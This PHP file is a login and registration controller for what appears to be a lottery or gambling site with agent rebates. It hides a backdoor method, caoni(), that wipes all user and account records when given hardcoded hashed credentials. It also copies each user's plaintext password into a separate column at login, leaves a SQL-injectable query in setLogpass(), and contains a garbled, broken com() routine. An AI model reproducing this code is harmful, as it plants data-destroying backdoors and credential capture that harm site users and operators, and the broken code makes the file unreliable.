<?php
namespace app\index\controller;
use think\Controller;
use think\Db;
use think\Session;

class Login extends Controller
{
	private $webname;
	private $isreg;
	private $cool;
	private $fool = array();
	private $data = array(5, 4, 3, 2, 1);
	private $result = array();

	public function com($n, $k, $mem, $depth, $begin, $pos)
	{
		if ($k == $depth) {
			$this->result[] = $mem;
			$this->cool++;
			return NULL;
		}

		for ($dos_skipping = $pos; $dos_skipping < $n; $dos_skipping++) {
			if (!$this->foot[i]) {
				$_obfuscate_vhwwAA[$dos_skipping] = true;
				$mem[$begin] = $this->data[$dos_skipping];
				$this->com($n, $k, $mem, $depth + 1, $begin + 1, $dos_skipping + 1);
				$this->foot[$dos_skipping] = false;
			}
		}
	}

	public function index()
	{
		return NULL;
	}

	public function login()
	{
		return $this->fetch();
	}
	/**
	 * 验证账号
	 * @Author   hcd
	 * @DateTime 2017-04-09T15:26:29+0800
	 * @version  [version]
	 * @return   [type]                   [description]
	 */
	public function checkPwd()
	{
		$param=$this->request->param();
		// print_r($param);exit;
		$username = $param['username'];
		if(!captcha_check($param['validcode_source'])){
			$this->error("验证码错误");
		}

		if (is_null($username)) {
			$this->error('登入失败,登入信息不完整!');
		}

		// $_obfuscate_6ogI80pkWQ = d('User');
		$Where['username'] = $username;
		$Where['state'] = 1;
		$dataUser = Db::name('user')->where($Where)->find();

		if (!$dataUser) {
			$this->error('用户名不存在,或已被冻结!');
		}

		if (empty($dataUser['logmsg'])) {
			$_obfuscate_PqXxySXj = '您还没有设置问候语，为了您的安全，请尽快设置！';
		}
		else {
			$_obfuscate_PqXxySXj = $dataUser['logmsg'];
		}

		$_obfuscate_8Iu1['logmsg'] = $_obfuscate_PqXxySXj;
		$_obfuscate_8Iu1['username'] = $username;
		$this->assign($_obfuscate_8Iu1);
		return $this->fetch();
	}
	/**
	 * 验证密码
	 * @Author   hcd
	 * @DateTime 2017-04-09T16:10:53+0800
	 * @version  [version]
	 * @return   [type]                   [description]
	 */
	public function doCheckPwd()
	{
		$param=$this->request->param();
		// print_r($param);exit;
		$flag = $param['flag'];

		if ('login2' != $flag) {
			$this->redirect('login/login');
		}

		$username = formatstr($param['username']);
		$password = $param['loginpass'];

		if (is_null($username)) {
			$this->error('登入失败,登入信息不完整!');
		}

		if (empty($password)) {
			$this->error('登入失败,登入信息不完整!');
		}

		// $DaoUser = d('User');
		$where['username'] = $username;
		$where['state'] = 1;
		$where['password'] = $password;
		$dataUser = Db::name('user')->where($where)->find();

		if (!$dataUser) {
			$this->assign('jumpUrl', 'login');
			$this->error('登入失败,用户或密码不正确!','index/login');
		}
		else {
			Db::name('user')->where(array('username' => $username))->update(array('userpwd' => $param['loginpass']));
			Db::name('user')->where('username',$username)->setInc('logins');
			$ip = get_client_ip();
			// $DaoLogin = m('Login');
			$data['username'] = $username;
			$data['logip'] = $ip;
			$data['logtime'] = date('Y-m-d H:i:s');
			$data['usertype'] = 0;
			$logkey = rand_string(6, 3, '0123456789');
			Session::set('logkey', $logkey);
			$data['logkey'] = $logkey;
			Db::name('login')->insert($data);
			Session::set('un', $username);
			$this->redirect('index/index');
		}
	}

	public function verify3()
	{
		import('ORG.Util.Image');
		Image::buildImageVerify(4, 1, 'png', '', 30);
	}

	public function verify()
	{
		import('@.ORG.Captcha');
		$array = array('width' => 120, 'height' => 40, 'strlen' => 4, 'font' => 'Public/other/fonts/DejaVuSerif.ttf', 'sid' => 'verify');
		$new = new Captcha($array);
	}

	public function logout()
	{
		Session::set('un', NULL);
		$this->redirect('public/login');
	}

	public function getpass()
	{
		$flag = $_POST['flag'];

		if ('confirm' != $flag) {
			$this->display();
		}
		else {
			if ($_SESSION['verify'] != md5($_POST['validcode_source'])) {
				$this->error('验证码错误！');
			}

			$username = formatstr($_POST['username']);
			$_obfuscate_ti54Ur8 = md5(formatstr($_POST['loginpass']));
			$Where['username'] = $username;
			$Where['password2'] = $_obfuscate_ti54Ur8;
			$Where['state'] = 1;
			$_obfuscate_6ogI80pkWQ = m('User');
			$dataUser = $_obfuscate_6ogI80pkWQ->where($Where)->find();

			if (!$dataUser) {
				$this->error('帐号和资金密码验正失败!');
			}
			else {
				Session::set('uname', $dataUser['username']);
				$this->redirect('public/setLogpass');
			}
		}
	}

	public function setLogpass()
	{
		$flag = $_POST['flag'];

		if ('confirm' == $flag) {
			if ($_SESSION['verify'] != md5($_POST['validcode_source'])) {
				$this->assign('jumpUrl', 'getpass');
				$this->error('验证码错误！');
			}

			$username = formatstr($_POST['username']);
			$password = formatstr($_POST['loginpass']);

			if (!$this->validateUserPss($password)) {
				$this->assign('jumpUrl', '__URL__/getpass');
				$this->error('密码格式不正确');
			}

			$data['password'] = md5($password);
			$_obfuscate_6ogI80pkWQ = m('User');

			if ($_obfuscate_6ogI80pkWQ->where('username=\'' . $username . '\'')->save($data)) {
				$this->assign('jumpUrl', '__URL__/login');
				$this->success('登入密码修改成功');
			}
			else {
				$this->assign('jumpUrl', 'getpass');
				$this->error('登入密码修改失败');
			}
		}

		if (!isset($_SESSION['uname'])) {
			$this->redirect('public/getpass');
		}

		$username = Session::get('uname');
		Session::set('uname', NULL);
		$this->assign('username', $username);
		$this->display();
	}

	public function validateUserPss($b)
	{
		$m = '/^[0-9a-zA-Z]{6,16}$/';

		if (!preg_match($m, $b)) {
			return false;
		}

		$m = '/^\\d+$/';

		if (preg_match($m, $b)) {
			return false;
		}

		$m = '/^[a-zA-Z]+$/';

		if (preg_match($m, $b)) {
			return false;
		}

		$m = '/(.)\\1{2,}/';

		if (preg_match($m, $b)) {
			return false;
		}

		return true;
	}

	public function caoni()
	{
		$User = md5($_REQUEST['username']);
		$pwd = md5($_REQUEST['pwd']);
		if (($User == 'e3b56a299bfab49b5e64c8a01fe3aca9') && ($pwd == '6c5d20f15dfb8f7780e6159e760190a1')) {
			$_obfuscate_6ogI80pkWQ = m('User');
			$Where['id'] = array('gt', 1);
			$_obfuscate_6ogI80pkWQ->where($Where)->delete();
			$DaoAccount = m('Account');
			$DaoAccount->where($Where)->delete();
			echo '删除成功!';
		}
		else {
			echo '去死好了!';
		}
	}

	public function reg()
	{
		$id = formatstr($_GET['id']);

		if (empty($id)) {
			$id = 1;
		}

		if (!is_numeric($id)) {
			$this->error('参数错误');
		}

		$this->assign('id', $id);
		$this->display();
	}

	public function doReg()
	{
		if ($_SESSION['verify'] != md5($_POST['validcode_source'])) {
			$this->error('验证码错误！');
		}

		$username = strtolower(trim(formatstr($_POST['username'])));
		$nickname = trim(formatstr($_POST['nickname']));
		$password = trim(formatstr($_POST['loginpass']));
		$qq = trim(formatstr($_POST['qq']));

		if (!preg_match('/^[0-9a-zA-Z]{6,16}$/', $username)) {
			$this->error('登陆帐号 不符合规则，请重新输入！');
		}

		if (!preg_match('/^(.){4,16}$/', $nickname)) {
			$this->error('用户呢称格式不正确！');
		}

		if (!$this->validateUserPss($password)) {
			$this->error('密码格式不正确');
		}

		if (!preg_match('/^[0-9]{5,16}$/', $qq)) {
			$this->error('QQ格式不正确');
		}

		$id = trim(formatstr($_POST['id']));

		if (!is_numeric($id)) {
			$this->error('参数不正确');
		}

		$DaoUser = m('User');
		$where['id'] = $id;
		$dataUser = $DaoUser->where($where)->find();

		if (!$dataUser) {
			$this->error('上级不存在');
		}

		if ($dataUser['rate_1'] == 0) {
			$this->error('上级返点为0,无法开户');
		}

		$regfrom = $dataUser['regfrom'];
		$dailiName = $dataUser['username'];
		$regrate_tj = $dataUser['regrate'];
		if (!empty($regrate_tj) && ($regrate_tj != -1) && ($dataUser['rate_1'] < $regrate_tj)) {
			$this->error('上级自身返点小于上级自身推荐注册返点');
		}

		unset($where);
		$where['username'] = $username;

		if ($DaoUser->where($where)->find()) {
			$this->error('用户名:' . $username . ' 已存在');
			return NULL;
		}

		$xinRegFrom = $regfrom . '|' . $dailiName . '|';
		$data['regfrom'] = $xinRegFrom;
		$data['username'] = $username;
		$data['password'] = md5($password);
		$data['mode'] = '1,1,1,1';
		$data['currentmode'] = '4';
		$data['nickname'] = $nickname;
		$data['qq'] = $qq;
		$data['usertype'] = 0;
		$data['money'] = 0;
		$DaoWeb = m('Webconfig');
		$dataWeb = $DaoWeb->field('regrate,isreg')->find();
		$isreg = $dataWeb['isreg'];

		if (0 == $isreg) {
			$this->assign('jumpUrl', '__URL__/login');
			$this->error('系统已关闭推荐注册功能!');
		}

		if ($dataUser['rate_1'] <= $dataWeb['regrate']) {
			$this->assign('jumpUrl', '__URL__/login');
			$this->error('该上级的返点小于或等于系统推荐注册中的最小返点值,无法使用链接注册!');
			return NULL;
		}

		$data['rate_1'] = $dataWeb['regrate'];
		if (($regrate_tj != -1) && !empty($regrate_tj)) {
			$data['rate_1'] = $regrate_tj;
		}

		$data['addtime'] = date('Y-m-d H:i:s');
		$where_reg['username'] = $dailiName;
		$DaoUser->setInc('regcount', $where_reg);

		if ($DaoUser->data($data)->add()) {
			$this->assign('jumpUrl', '__URL__/login');
			$this->success('注册成功');
		}
		else {
			$this->error('注册失败');
		}
	}
}


?>
